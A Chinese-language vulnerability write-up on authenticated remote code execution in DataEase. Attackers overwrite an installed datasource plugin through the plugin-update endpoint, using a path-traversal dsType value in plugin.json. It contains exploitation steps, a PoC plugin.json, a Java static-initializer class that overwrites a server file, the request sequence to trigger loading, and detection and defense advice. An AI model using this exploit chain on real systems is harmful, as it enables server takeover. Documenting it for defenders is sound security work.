---
id: web-java-component-dataease-plugin-update-zip-malicious-plugin-rce
title: DataEase /api/plugin/update 插件包更新：zip 内 plugin.json 可控 dsType + 覆盖已安装插件 jar，插件类静态初始化块直接执行任意代码
type: scenario
domain: web
path: web/java/component
technique: plugin-update-zip-overwrite-malicious-jar-rce
tags:
- java
- dataease
- plugin
- file-upload
- rce
- authenticated
- path-traversal
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:52:57+08:00'
  notes: 已对照原文核对；nginx 三条 POST 403 规则、plugin.json 全部字段、DmConfig 静态块（覆盖 /flag.html）、自动化脚本中的 /api/plugin/update/13 与 /datasource/getSchema/ 触发流程均与正文一致；本次核对未读取图片，dsType=../default/dm 参与插件目录/类名拼接的具体逻辑只在 img/04、img/05 截图中，卡内已注明属推断，patch.jar 具体改法原文未给
url: /docs/web/java/component/web-java-component-dataease-plugin-update-zip-malicious-plugin-rce/
draft: false
kb_aliases:
- DataEase 插件更新 RCE
- plugin.json dsType 路径穿越
- api/plugin/update 上传插件包
- 覆盖数据源插件 jar
- 后台插件 getShell
---

## 一句话结论

DataEase 的插件更新接口 `POST /api/plugin/update/{pluginId}` 接收一个 zip（内含 `plugin.json` 与插件 jar）并直接落盘覆盖已安装插件；`plugin.json` 中的 `dsType` 等字段参与插件目录/类名拼接，可被写成 `../default/dm` 之类穿越值，使攻击者用一个合法插件 ID 的包替换掉某个数据源插件，之后只要触发该插件加载（如新建该类型数据源触发 `getSchema`），插件类的静态初始化块即执行任意 Java 代码——从后台权限升级为服务器 RCE。

## 原理

- **插件即代码**：DataEase 的插件是一段被 `PluginClassLoader` 加载进同一 JVM 的 jar，插件包由 `plugin.json`（`moduleName`、`version`、`dsType` 等元数据）+ jar 组成。任何「上传/更新插件」功能在实现上等价于「上传可执行代码」，只校验包结构、不校验代码来源与签名，就必然导致代码执行。
- **更新接口与安装接口权限面不同**：网关/反代常按路径做粗粒度封禁（原文 nginx 对 `/api/plugin/upload`、`/driver/file/upload`、`/staticResource/upload/` 的 POST 直接 return 403），但 `POST /api/plugin/update/{pluginId}` 未被这条规则覆盖；因此即使「安装」被禁，仍可用「更新已装插件」把恶意包写进去。
- **`plugin.json` 字段进入路径/模块解析**：原文指出更新逻辑对 `plugin.json` 内容做了拼接（`dsType`/`moduleName` 参与确定插件目录与入口类），把 `dsType` 写成 `../default/dm` 即可让更新落在已安装的默认达梦数据源插件上；同时把 `version` 抬高（如 `1.18.26`）满足「版本比较/覆盖」的前置判断，使更新被接受。
- **执行时机**：插件 jar 的类在被类加载器首次初始化时执行静态初始化块，因此不需要访问任何接口，只要业务侧触发了该数据源类型的插件类（原文用 `POST /datasource/getSchema/` 传入 `"type":"dm"`），恶意 `static {}` 就会跑，直接 `new FileOutputStream("/flag.html")` 覆盖目标文件。
- 本质是**功能边界 + 权限边界失真**：更新插件本应只允许受信来源；一旦「后台账号」即可调用，就等于把服务器上的任意代码执行以 Web 接口形式暴露出来，而网关只按路径封了一部分上传口。

## 触发条件

- 攻击者拥有 DataEase 后台账号（能拿到 `Authorization` token；原文脚本用默认/弱口令登录 `POST /api/auth/login`）。
- `POST /api/plugin/update/{id}` 对当前账号开放，且网关未拦截该路径（原文仅封了 upload、driver upload、staticResource upload）。
- 目标已有对应 `dsType` 的数据源插件（如 `dm`），供恶意包覆盖；或存在可被 `../` 穿越定位到的插件目录。
- 触发插件类初始化需要一个业务入口（新建/测试该类型数据源）。

## 利用步骤

1. 登录获取 token：`POST /api/auth/login`，取响应中的 `token` 作为 `Authorization` 头。
2. 准备恶意插件包：`plugin.json` + `patch.jar`，其中 `dsType` 写 `../default/dm`、`version` 写比目标现有版本高的值，jar 内放一个与被覆盖插件同包名的类（如 `io.dataease.plugins.datasource.dm.provider.DmConfig`），`static {}` 里写落地文件的代码。
3. `zip -r poc.zip patch.jar plugin.json`。
4. `POST /api/plugin/update/13`（multipart，字段 `pluginId`=目标插件 ID、`file`=poc.zip），响应含 `true` 即写入成功。
5. 触发加载：`POST /datasource/getSchema/`，body 中 `type` 设为被覆盖插件的类型（`dm`），让插件类初始化。
6. 访问被写入的文件确认执行（原文覆盖 `/flag.html` 后 GET 该页面拿到预期内容）。

## PoC

```json
{
  "name": "达梦数据源插件",
  "store": "default",
  "free": 0,
  "cost": 0,
  "category": "datasource",
  "descript": "达梦数据源插件",
  "version": "1.18.26",
  "creator": "DATAEASE",
  "moduleName": "dm-backend",
  "icon": null,
  "dsType": "../default/dm"
}
```

```java
package io.dataease.plugins.datasource.dm.provider;

public class DmConfig {
  static {
    try {
      new java.io.File("/flag.html").delete();
      java.io.FileOutputStream out = new java.io.FileOutputStream("/flag.html");
      out.write("<html>hacked</html>".getBytes());
      out.close();
    } catch (Exception e) { throw new RuntimeException(e); }
  }
}
```

```text
# 打包与投递
zip -r poc.zip patch.jar plugin.json
POST /api/plugin/update/13   (multipart: pluginId=13, file=poc.zip)
POST /datasource/getSchema/  {"type":"dm", ...}   # 触发插件类加载
GET  /flag.html
```

原文明示不提供 patch 后的 jar（只给思路与 `DmConfig` 结构），因此上述 jar 需自行按同名类打补丁；`dsType` 穿越值的实际落点依赖目标插件目录结构。

## 变体与关联

- **同类「插件/扩展即代码」面**：任何后台插件安装/更新接口只要收 zip/jar 就直接落盘并加载，都可套用同一思路（参见 `web/java/component` 下 FastCMS/PF4J 插件上传卡；PHP 生态的插件更新解压 getshell 见 `web/php/rce`）。
- **路径封禁差异**：不同部署里被网关拦下的可能是 `upload`、`import`、`restore` 等路径，而 `update`/`patch`/`upgrade` 往往漏封；枚举后台控制器里所有「写文件」端点比只试一个上传口更有效。
- **触发点变体**：插件类也可不自带 `static {}`，改为在被调用的 `getJdbc()`/`setDriver()` 等方法里执行，或用 SPI/工厂类在容器启动时加载。
- **初始访问变体**：原文用登录接口的固定密文口令直接登录（等价于已知/默认凭据）；结合 DataEase 其它鉴权缺陷（如 CommunityTokenFilter fail-open 卡）可在无凭据时进入同一更新接口。
- 边界：目标对插件包做签名/来源校验、把插件目录设为只读、或更新接口校验包内文件哈希时不成立；`dsType` 穿越语义依赖具体版本的路径拼接实现，版本升级后可能失效。

## 检测与防御

- 检测：`/api/plugin/update/*` 的 multipart 上传（正常运维极少走该接口）；插件目录中 jar 的哈希/版本突变；`plugin.json` 中出现 `..`、绝对路径或异常的 `dsType`；上传后短时间内出现数据源 `getSchema` 等触发请求；JVM 内加载了与插件包不符的新类。
- 防御：插件安装/更新限定超级管理员并二次认证，网关按方法+路径拦截全部上传类端点（不要只封 `upload`）；插件包做签名校验与白名单来源；插件目录对应用进程只读或独立挂载；解析 `plugin.json` 时对 `dsType`/`moduleName` 做白名单与路径规范化（`canonicalPath` 必须落在插件根目录内）；升级到已修复版本。
